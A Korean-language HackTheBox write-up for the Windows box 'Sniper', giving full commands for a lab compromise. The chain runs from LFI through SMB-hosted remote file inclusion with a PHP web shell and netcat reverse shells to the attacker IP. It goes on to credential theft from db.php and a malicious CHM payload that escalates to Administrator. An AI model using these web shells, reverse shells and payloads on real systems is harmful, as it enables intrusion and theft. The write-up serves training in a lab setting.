# HackTheBox - Sniper Writeup

**OS:** Windows  
**Difficulty:** Medium  
**IP:** 10.129.229.6

---

## 목차

1. [[#정보 수집 (Enumeration)]]
2. [[#LFI 취약점 발견]]
3. [[#RFI via SMB - RCE 획득]]
4. [[#DB 비밀번호 탈취 - Chris 접근]]
5. [[#악성 CHM으로 Administrator 권한 상승]]
6. [[#Root Flag]]
7. [[#삽질 모음]]
8. [[#공격 흐름 요약]]

---

## 정보 수집 (Enumeration)

### Nmap 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.229.6
```

**열린 포트:**

|포트|서비스|
|---|---|
|80/tcp|HTTP|
|135/tcp|MSRPC|
|139/tcp|NetBIOS-SSN|
|445/tcp|Microsoft-DS|
|49667/tcp|Unknown|

### 웹 디렉토리 스캔

```bash
gobuster dir -u http://10.129.229.6 -w /usr/share/wordlists/dirb/common.txt
```

**발견된 경로:**

- `/blog/` → 블로그 페이지 (언어 선택 메뉴 존재)
- `/user/` → 회원가입/로그인 포털
- `/index.php`

---

## LFI 취약점 발견

### lang 파라미터 발견

`/blog/` 접속 후 Language 메뉴 클릭 시 URL:

```
http://10.129.229.6/blog/?lang=blog-en.php
```

**GET 파라미터: `lang`** ✅

### LFI 테스트

상대경로는 작동 안 함:

```
http://10.129.229.6/blog/?lang=../index.php  → 404
http://10.129.229.6/blog/?lang=../../../../windows/win.ini  → 404
```

**절대경로는 작동!**

```
http://10.129.229.6/blog/?lang=\windows\win.ini  → 성공 ✅
```

### PHP 세션 파일 경로

Windows PHP 세션 파일 기본 경로:

```
C:\Windows\Temp\sess_[PHPSESSID]
```

세션 파일 읽기:

```bash
curl -s -G 'http://10.129.229.6/blog/' --data-urlencode 'lang=\windows\temp\sess_[PHPSESSID]'
```

### 현재 작업 디렉토리

LFI + PHP 코드 인젝션으로 `dir` 명령어 실행 결과:

```
Directory of C:\inetpub\wwwroot\blog
```

**현재 디렉토리: `C:\inetpub\wwwroot\blog`** ✅

---

## RFI via SMB - RCE 획득

### Samba 공유 설정 (Kali)

HTTP RFI는 차단되어 있지만 **SMB RFI는 가능!**

```bash
# /etc/samba/smb.conf 맨 아래에 추가
sudo nano /etc/samba/smb.conf
```

```ini
[share]
path = /srv/samba/
browseable = yes
read only = no
create mask = 777
guest ok = yes
force user = nobody
force group = nogroup
```

```bash
sudo mkdir -p /srv/samba
sudo chmod 777 /srv/samba

# 웹쉘 생성
cat > /srv/samba/cmd.php << 'EOF'
<?php echo "<pre>"; system($_GET['cmd']); echo "</pre>"; die; ?>
EOF

sudo chmod 777 /srv/samba/cmd.php
sudo service smbd restart
sudo service nmbd restart
```

### RCE 확인

```bash
curl -s -G 'http://10.129.229.6/blog/' \
  --data-urlencode 'lang=\\10.10.17.240\share\cmd.php' \
  --data-urlencode 'cmd=whoami'
```

**결과:** `nt authority\iusr` ✅

### Reverse Shell 획득

```bash
# nc.exe Samba에 복사
cp /usr/share/windows-resources/binaries/nc.exe /srv/samba/

# 리스너
nc -lvnp 4444

# 실행
curl -s -G 'http://10.129.229.6/blog/' \
  --data-urlencode 'lang=\\10.10.17.240\share\cmd.php' \
  --data-urlencode 'cmd=\\10.10.17.240\share\nc.exe 10.10.17.240 4444 -e cmd.exe'
```

---

## DB 비밀번호 탈취 - Chris 접근

### db.php 파일 읽기

```bash
curl -s -G 'http://10.129.229.6/blog/' \
  --data-urlencode 'lang=\\10.10.17.240\share\cmd.php' \
  --data-urlencode 'cmd=type C:\inetpub\wwwroot\user\db.php'
```

**결과:**

```php
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
```

**Chris 비밀번호: `36mEAhz/B8xQ~2VM`** ✅

### Chris 권한으로 명령 실행

```cmd
powershell -c "$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('sniper\chris', $pass); Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}"
```

### User Flag

```cmd
powershell -c "$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('sniper\chris', $pass); Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {type C:\Users\chris\Desktop\user.txt}"
```

**User Flag 획득** ✅

### Chris Downloads 폴더 탐색

```cmd
powershell -c "$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('sniper\chris', $pass); Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {Get-ChildItem C:\Users\chris\Downloads}"
```

**발견:** `instructions.chm` (CEO가 보낸 지시 파일)

```bash
# Samba로 가져와서 분석
powershell -c "... {Copy-Item C:\Users\chris\Downloads\instructions.chm \\10.10.17.240\share\instructions.chm}"

strings /srv/samba/instructions.chm
# → 'docs' 키워드 발견
```

**힌트 정리:**

- CEO가 `C:\Docs`에 문서 전달 요청
- 파일 형식: `.chm`
- `C:\Docs`의 .chm 파일을 **Administrator**가 열어봄

---

## 악성 CHM으로 Administrator 권한 상승

### 준비물

1. **HTML Help Workshop** - .chm 컴파일러 (서버에 설치 필요)
2. **Nishang Out-CHM.ps1** - 악성 .chm 생성 도구
3. **nc64.exe** - reverse shell

### nc64.exe 준비

```bash
cp /srv/samba/nc.exe /srv/samba/nc64.exe
```

### HTML Help Workshop 설치 (Chris 권한으로)

```bash
# htmlhelp.exe를 Samba에 올려놓고
wget -O /srv/samba/htmlhelp.exe "[htmlhelp.exe URL]"
```

Windows 쉘에서:

```cmd
powershell -c "$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('sniper\chris', $pass); Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {Start-Process '\\10.10.17.240\share\htmlhelp.exe' -ArgumentList '/quiet' -Wait}"
```

### Out-CHM.ps1으로 악성 .chm 생성

```bash
# Out-CHM.ps1 Samba에 복사
cp /home/kali/nishang/Client/Out-CHM.ps1 /srv/samba/
```

Windows 쉘 (C:\temp에서):

```cmd
mkdir C:\temp
cd C:\temp
powershell -c "IEX(New-Object Net.WebClient).DownloadString('\\10.10.17.240\share\Out-CHM.ps1'); Out-CHM -Payload '\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.17.240 5555' -HHCPath 'C:\Program Files (x86)\HTML Help Workshop' -OutputPath 'C:\temp'"
```

### nc64.exe 배치 및 doc.chm 복사

```cmd
# nc64.exe를 AppLocker 우회 경로에 복사
copy \\10.10.17.240\share\nc64.exe \windows\system32\spool\drivers\color\

# 악성 chm을 C:\Docs에 복사
copy C:\temp\doc.chm C:\Docs\
```

### 리스너 대기

```bash
nc -lvnp 5555
```

잠시 후 Administrator가 .chm 파일을 열면 연결됨!

### Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## 삽질 모음

### 1. LFI 상대경로 안됨

- `../`, `..\\` 등 상대경로 전부 404
- **해결:** `\windows\win.ini` 같은 절대경로만 작동

### 2. HTTP RFI 차단

- `http://[Kali IP]/cmd.php` 형식의 RFI 안됨
- **해결:** SMB RFI (`\\[Kali IP]\share\cmd.php`) 사용

### 3. Samba 인증 문제

- `smbserver.py` 사용 시 인증 실패
- **해결:** 실제 Samba 서비스 설치 후 `guest ok = yes` 설정

### 4. PHP 세션 LFI + 코드 인젝션 실패

- username에 `<?php system("whoami") ?>` 등록 시 로그인 거부
- `<?php echo \`whoami` ?>` 백틱 방식도 세션 파일이 비어있음
- **해결:** SMB RFI 방식으로 우회

### 5. Kali IP 착각

- `hostname -I` 결과에서 tun0 IP 확인 필요
- 실제 HTB 네트워크 IP: `10.10.17.240` (두 번째 값)

### 6. Out-CHM 권한 오류

- `C:\inetpub\wwwroot\blog`에서 실행 시 쓰기 권한 없음
- **해결:** `C:\temp` 디렉토리 생성 후 `-OutputPath C:\temp` 지정

### 7. HTML Help Workshop 미설치

- Out-CHM이 `hhc.exe`를 필요로 함
- 서버에 HTML Help Workshop가 없어서 별도 설치 필요

### 8. evil-winrm 느림 / PSSession WSMan 오류

- evil-winrm은 연결이 너무 느림
- pwsh의 Enter-PSSession은 WSMan 라이브러리 없음 오류
- **해결:** Invoke-Command로 Chris 권한 명령 실행

---

## 공격 흐름 요약

```
[Nmap 스캔]
    ↓
[Gobuster 디렉토리 스캔]
    → /blog/, /user/ 발견
    ↓
[LFI 발견 (?lang=)]
    → 절대경로만 작동
    → 세션 파일 읽기 가능
    ↓
[SMB RFI로 RCE 획득]
    → Samba 공유 설정
    → cmd.php 웹쉘 실행
    → nt authority\iusr 쉘
    ↓
[db.php에서 Chris 비밀번호 탈취]
    → 36mEAhz/B8xQ~2VM
    → Invoke-Command로 Chris 권한 명령 실행
    ↓
[User Flag 획득]
    → C:\Users\chris\Desktop\user.txt
    ↓
[instructions.chm 분석]
    → C:\Docs에 .chm 전달
    → Administrator가 열어봄
    ↓
[악성 CHM 제작 (Out-CHM + Nishang)]
    → nc64.exe AppLocker 우회 경로 배치
    → doc.chm → C:\Docs\ 복사
    ↓
[Administrator 리버스쉘]
    → sniper\administrator
    → root.txt 획득 🎉
```

---

